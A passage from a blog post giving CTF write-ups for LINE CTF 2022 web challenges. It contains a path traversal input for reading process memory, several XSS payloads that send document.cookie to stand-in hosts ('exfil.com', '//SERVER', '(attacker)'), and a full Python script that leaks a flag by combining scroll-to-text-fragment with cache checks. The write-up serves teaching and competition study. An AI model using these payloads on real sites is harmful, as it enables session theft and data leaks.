    <span class="token keyword">const</span> <span class="token literal-property property">s</span><span class="token operator">:</span> number <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>s<span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token literal-property property">e</span><span class="token operator">:</span> number <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>e<span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token literal-property property">t</span><span class="token operator">:</span> string <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>t

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\x00-\x1f]|\x7f|\&lt;|\></span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Invalid character in book title."</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>
        Fs<span class="token punctuation">.</span><span class="token function">stat</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> <span class="token literal-property property">stats</span><span class="token operator">:</span> Fs<span class="token punctuation">.</span>Stats<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"No such a book in bookself."</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!==</span> <span class="token number">NaN</span> <span class="token operator">&amp;&amp;</span> e <span class="token operator">!==</span> <span class="token number">NaN</span> <span class="token operator">&amp;&amp;</span> s <span class="token operator">&lt;</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Too large to read."</span><span class="token punctuation">)</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        Fs<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> <span class="token literal-property property">fd</span><span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token operator">||</span> <span class="token keyword">typeof</span> fd <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Invalid argument."</span><span class="token punctuation">)</span>
                            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">let</span> <span class="token literal-property property">buf</span><span class="token operator">:</span> Buffer <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">alloc</span><span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
                                Fs<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> <span class="token literal-property property">bytesRead</span><span class="token operator">:</span> number<span class="token punctuation">,</span> <span class="token literal-property property">buf</span><span class="token operator">:</span> Buffer<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                                    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1>&lt;hr/></span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"There isn't size of book."</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Put <code>/%2e%2e%2f/0/12345</code> in the path, and you can perform path traversal and read any file, but the question is which file to read.</p>
<p>With the help of teammates, we read <code>/proc/self/mem</code>, which is the memory of the current node process. As for which segment to read, you have to look it up from <code>/proc/self/maps</code>.</p>
<p>Then, because an endpoint will put the parameters into memory, you can use that endpoint to put your payload first, and then because this problem gives an offset when reading the file, you can find the payload in memory and set the offset, and then send it to the bot for XSS.</p>
<p>However, according to post-match discussions, it seems that because the flag is in the cookie, when the bot sends a request to the server, the flag will also appear in the memory, so you can directly read the memory to find the flag without using XSS.</p>
<h2><span id="haribote-secure-note7-solves">Haribote Secure Note(7 solves)</span></h2><p>This problem took a whole day to solve, but still couldn’t solve it, so sad QQ</p>
<p>You can set a nickname, up to 16 characters, and then add notes with a title and content. The key code for displaying notes is here:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; csp_nonce &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> <span class="token function-variable function">printInfo</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> sharedUserId <span class="token operator">=</span> <span class="token string">"&#123;&#123; shared_user_id &#125;&#125;"</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> sharedUserName <span class="token operator">=</span> <span class="token string">"&#123;&#123; shared_user_name &#125;&#125;"</span><span class="token punctuation">;</span>
        <span class="token comment">// 省略</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">const</span> printInfoBtn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'printInfoBtn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printInfoBtn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> printInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>And this part near the end:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; csp_nonce &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> <span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token parameter">notes</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 省略</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> notes <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The former gives us 16 characters of JS injection, and the latter can use <code>&lt;/script&gt;</code> to escape the tag, which is HTML injection. The difficulty of this problem lies in the fact that the CSP is very strict:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default<span class="token punctuation">"</span></span>
          <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Because there is a nonce, <code>unsafe-inline</code> does not work, and <code>unsafe-eval</code> is not enabled, so there is no way to dynamically execute code.</p>
<p>At the time, after struggling for a long time, I had an idea that we could use HTML injection to insert a form <code>&lt;form id=&quot;f&quot;&gt;</code>, and then CSRF admin to change the admin’s nickname, because the other page profile has no CSP and can also be injected:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>display_name<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-control form-control-sm<span class="token punctuation">"</span></span>
 <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inputUserDisplayName<span class="token punctuation">"</span></span>
 <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; current_user.display_name &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>The nickname part can be set to <code>&quot;;f.submit();&quot;</code> or similar, to submit the form. After changing it, visit the profile page and execute XSS on that page.</p>
<p>But the biggest problem is that <code>&quot;onfocus=eval(name)</code> has 20 characters, which exceeds the limit and cannot be successful (and you also need to think about how to set the name).</p>
<p>After the competition, I looked at other people’s solutions, mainly three types.</p>
<p>The first one comes from <a target="_blank" rel="noopener" href="https://gist.github.com/mdsnins/d8028c47212342ecadd9af5ec10f53f9">Super HexaGoN</a>, which uses a magical <a target="_blank" rel="noopener" href="https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state">script data double escaped state</a> to comment out everything between the two injection points, and then execute the code in a script with a nonce. I had never seen this before, so I’ll have to study it later.</p>
<pre class="line-numbers language-none"><code class="language-none">display name: &lt;!--&lt;script&gt;&quot;&#125;&#x2F;*
title: --&gt; &#x2F;*
content: *&#x2F; location.href&#x3D;&#39;(attacker)&#x2F;c&#x3D;&#39;+document.cookie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>The second one uses the feature that <a target="_blank" rel="noopener" href="https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#script-loading-like-import">import is not blocked by Trusted Types</a>, and the payload below comes from <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#haribote-secure-note">maple3142</a>:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">display name<span class="token operator">:</span>
<span class="token string">"+import(y)+"</span>

<span class="token literal-property property">title</span><span class="token operator">:</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>a id<span class="token operator">=</span>x href<span class="token operator">=</span><span class="token string">"//SERVER"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>

<span class="token literal-property property">content</span><span class="token operator">:</span>
<span class="token operator">&lt;</span>a id<span class="token operator">=</span>y href<span class="token operator">=</span><span class="token string">"data:text/javascript,open(x+`?`+document.cookie);alert()"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The third one uses an iframe to execute code on other pages (from eskildsen#8025):</p>
<pre class="line-numbers language-none"><code class="language-none">name:
&quot;;f.eval(p+&quot;&quot;);&quot;

title:
&lt;&#x2F;script&gt;&lt;iframe src&#x3D;&quot;&#x2F;p&quot; name&#x3D;f&gt;&lt;&#x2F;iframe&gt; 

content:
&lt;a href&#x3D;&quot;javascript:window.top.location&#x3D;&#39;http:&#x2F;&#x2F;exfil.com&#x2F;&#39;+btoa(this.parent.document.cookie)&quot; id&#x3D;p name&#x3D;p&gt;payload&lt;&#x2F;a&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The third one is the only one I think I might have thought of, because I didn’t know the other two.</p>
<p>By the way, <code>&quot;;f.eval(p+&quot;&quot;);&quot;</code> and <code>&lt;!--&lt;script&gt;&quot;&#125;/*</code> both happen to be 16 characters long, so I guess one of them is an unexpected solution, which is the fun of CTF XD.</p>
<p>And this question is really interesting and worth learning, as all three solutions are completely different.</p>
<p>Oh, by the way, maple3142’s writeup solved a puzzle for me, which is why the templates for this question are not escaped. It turns out that Flask defaults to only escaping HTML&#x2F;XML&#x2F;XHTML, which is why I didn’t see any settings.</p>
<h2><span id="title-todo6-solves">title todo(6 solves)</span></h2><p>This question is basically a website for uploading pictures. After uploading, you will get a URL, and then you can create a new post with the title and image URL.</p>
<p>The flag is placed in the footer of the webpage when visited with admin privileges, and has a strange format: <code>LINECTF&#123;([0-9a-f]/)&#123;10&#125;&#125;</code>.</p>
<p>Then there is a place on the page that is not enclosed in double quotes:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>&#123;&#123;</span> <span class="token attr-name">image.url</span> <span class="token attr-name">&#125;&#125;</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mb-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Although it looks like a small detail, the entire solution actually stems from this. From here, it is easy to see that we can control any attribute of the img, but I was stuck here for a while, thinking that if we can control it, what’s the point? We can’t XSS if we can’t get out of the img.</p>
<p>Then, after being reminded by my teammate, I thought of the xsleak of <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/">STTF</a>, which detects scrolling behavior through the lazy loading of images. Therefore, as long as the title is very long, the img is pushed down, and the <code>loading=lazy</code> attribute is added, it can be used with STTF to leak one byte.</p>
<p>However, there is one thing to note about this question, which is CSP:</p>
<pre class="line-numbers language-none"><code class="language-none">default-src &#39;self&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;; img-src &#39;self&#39; blob:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>CSP cannot be bypassed, so even if <code>src</code> is controllable, external images cannot be set. Therefore, this question has added another mechanism: cache, which can determine whether the cache of an image is a miss or a hit based on the response header. Therefore, we only need to upload a new image and give it to the bot, and then check its response header after a few seconds. If it is a hit, it means that the bot has accessed the image, which means that SSTF has succeeded.</p>
<p>Just write an exploit based on this concept:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> time
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

base_url <span class="token operator">=</span> <span class="token string">'http://35.187.204.223'</span>
cookie <span class="token operator">=</span> <span class="token string">"session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8"</span>

<span class="token keyword">def</span> <span class="token function">upload_image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'img_file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'a.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'/image/upload'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_post</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'/image'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"w"</span><span class="token operator">*</span><span class="token number">5000</span><span class="token punctuation">,</span>
    <span class="token string">"img_url"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"/static/image/111 srcset=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string"> loading=lazy "</span></span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-ImageId"</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">share</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'/share'</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"path"</span><span class="token punctuation">:</span> <span class="token string">"image/"</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"#:~:text="</span> <span class="token operator">+</span> keyword<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> resp<span class="token punctuation">.</span>text

<span class="token keyword">def</span> <span class="token function">check_cached</span><span class="token punctuation">(</span>img_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> img_url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-Cache-Status"</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  known <span class="token operator">=</span> <span class="token string">"LINECTF&#123;"</span>
  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"trying:"</span> <span class="token operator">+</span> known<span class="token operator">+</span>char<span class="token punctuation">)</span>

      resp <span class="token operator">=</span> upload_image<span class="token punctuation">(</span><span class="token punctuation">)</span>
      img_url <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">"img_url"</span><span class="token punctuation">]</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"img url:"</span> <span class="token operator">+</span> img_url<span class="token punctuation">)</span>

      img_id <span class="token operator">=</span> create_post<span class="token punctuation">(</span>img_url<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"img id:"</span> <span class="token operator">+</span> img_id<span class="token punctuation">)</span>

      share_res <span class="token operator">=</span> share<span class="token punctuation">(</span>img_id<span class="token punctuation">,</span> known <span class="token operator">+</span> char<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"resp:"</span> <span class="token operator">+</span> share_res<span class="token punctuation">)</span>

      sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
      cache_resp <span class="token operator">=</span> check_cached<span class="token punctuation">(</span>img_url<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"cached:"</span> <span class="token operator">+</span> cache_resp<span class="token punctuation">)</span>
      <span class="token keyword">if</span> cache_resp <span class="token operator">==</span> <span class="token string">"HIT"</span><span class="token punctuation">:</span>
        known <span class="token operator">+=</span> char <span class="token operator">+</span> <span class="token string">"/"</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>known<span class="token punctuation">)</span>
        <span class="token keyword">break</span>


run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In addition, maple3142’s writeup solved a confusion for me, which is why the flag needs those <code>/</code>? It turns out that Chromium, in order to avoid this kind of xsleak, must match the entire word when judging SSTF in order to scroll.</p>
<p>For example, if there is this string on the page: <code>Hello world</code>, your text fragment specifies <code>He</code>, it will not work, it must be <code>Hello</code>, which is why this question uses <code>/</code> to separate, because if it is not separated, it will not be possible to leak one word at a time.</p>
<h2><span id="me7-ball2-solves">me7-ball(2 solves)</span></h2><p>This question seems to be more related to crypto, so I didn’t look at it carefully and directly posted Super HexaGoN’s writeup: <a target="_blank" rel="noopener" href="https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682">https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682</a></p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/03/30/en/amelia-wordpress-plugin-sensitive-data-exposure-detail/">Sensitive Data Disclosure in WordPress Plugin Amelia &lt; 1.0.49</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/03/14/en/javascript-number/">Common Mistakes When Using Numbers in JavaScript</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/03/27/linectf-2022-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
